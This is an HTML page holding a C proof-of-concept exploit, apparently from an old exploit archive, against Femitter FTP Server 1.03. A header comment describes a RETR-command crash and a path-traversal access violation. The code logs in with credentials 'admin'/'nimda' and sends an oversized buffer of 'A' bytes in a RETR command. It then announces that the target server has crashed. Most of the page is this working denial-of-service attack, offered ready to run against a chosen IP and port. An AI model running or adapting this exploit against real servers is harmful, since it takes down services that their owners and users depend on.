<html><head><title>Femitter FTP Server 1.03 (RETR) Remote Denial of Service Exploit PoC</title></head><pre>/*0-----------------------------------------------------------------------------------0*\
0											0
|											|
|	Femitter FTP Server 1.03 (RETR) Remote Denial of Service Exploit PoC		|
|											|
|	Summary: Femitter Server is an easy-to use HTTP and FTP server application	|
|	for Windows which allows you to use your own computer for sharing gigabytes	|
|	of files with your friends and colleagues.					|
|											|
|	Desc: Femitter HTTP/FTP 1.03 suffers from a denial of service vulnerability	|
|	and memory corruption that causes the application to crash. When we send to	|
|	the RETR command an argument like AAAA:AAAA or an overly long string of As	|
|	(1024), the server crashes instantly. Also, when typing into browser:		|
|	ftp://127.0.0.1/\.. we traverse to the install folder of the program(CWD),	|
|	and when browsing to ftp://127.0.0.1/\..\/\..\ we get access violation at	|
|	address 004A218A in module &quot;fem.exe&quot;. Write of address 00000000.		|
|											|
|	Producst web page: http://acritum.com/fem/index.htm				|
|											|
|	Tested on Microsoft Windows XP SP2 (English)					|
|											|
|	Vulnerability discovered by Gjoko 'LiquidWorm' Krstic				|
|											|
|	liquidworm [t00t] gmail.com							|
|											|
|	http://www.zeroscience.org/							|
|											|
|	17.09.2008									|
|											|
0											0
\*0-----------------------------------------------------------------------------------0*/


#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;netdb.h&gt;


#define MANA &quot;\x52\x45\x54\x52\x20\x41\x41\x41\x41\x3A\x41\x41\x41\x41\xD\xA&quot;


void header(void);


int main (int argc, char *argv[])
{

	
	int sckt = 0, sfd = 0;
	char user[] = &quot;USER admin\r\n&quot;;
	char pass[] = &quot;PASS nimda\r\n&quot;;

	unsigned char payload[]=

	&quot;\x52\x45\x54\x52\x20\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot;
	&quot;\x41\x41\x41\xD\xA&quot;;

	header();
	
	if(argc != 3)
	{
		printf(&quot;\nUsage: %s [ip] [port]\n\n&quot;, argv[0]);
		return (EXIT_SUCCESS);
	}
	
	struct sockaddr_in dos_ftp;
	sfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sfd &lt; 0)
	{
		perror(&quot;Socket&quot;);
		printf(&quot;Error creating socket...\n&quot;);
		return(1);
	} 
	
	printf(&quot;\n\n[+] Socket created!\n&quot;);
	sleep (1);

	memset(&amp;dos_ftp, 0x0, sizeof(dos_ftp));
	dos_ftp.sin_family = AF_INET;
	dos_ftp.sin_addr.s_addr = inet_addr(argv[1]);
	dos_ftp.sin_port = htons(atoi(argv[2]));
	sckt = connect(sfd, (struct sockaddr *) &amp;dos_ftp, sizeof(dos_ftp));
	if(sckt &lt; 0)
	{
		perror(&quot;Connect&quot;);
		printf(&quot;Error connecting...\n&quot;);
		return(1);
	} 

	printf(&quot;[+] Connection established!\n&quot;);
	sleep (1);
	
	write(sfd, user, strlen(user)); // username
	printf(&quot;[+] Sending CMD: %s\n&quot;, user);
	sleep (2);
	
	write(sfd, pass, strlen(pass)); // password
	printf(&quot;[+] Sending CMD: %s\n&quot;, pass);
	sleep (2);
	
	printf(&quot;[+] Sending malicious buffer to %s on port %s ...\n&quot;, argv[1], argv[2]);
	sleep(2);

	send(sfd, payload, sizeof(payload), 0); // send(sfd, MANA, sizeof(MANA),0);
	printf(&quot;[+] Malicious buffer succesfully sent...\n&quot;);
	sleep (1);
	printf(&quot;[+] Femitter FTP Server v1.03 on %s has crashed!\n\n&quot;, argv[1]);
	
	close (sfd);

	return(0);
}

void header()
{
	printf(&quot;\n********************************************************************************\n\n&quot;);
	printf(&quot;\tFemitter FTP Server 1.03 (RETR) Remote Denial of Service Exploit PoC\n&quot;);
	printf(&quot;\t\t\tby LiquidWorm &lt;liquidworm [t00t] gmail.com&gt;\n\n&quot;);
	printf(&quot;********************************************************************************\n\n&quot;);
}

// milw0rm.com [2008-09-17]</pre></html>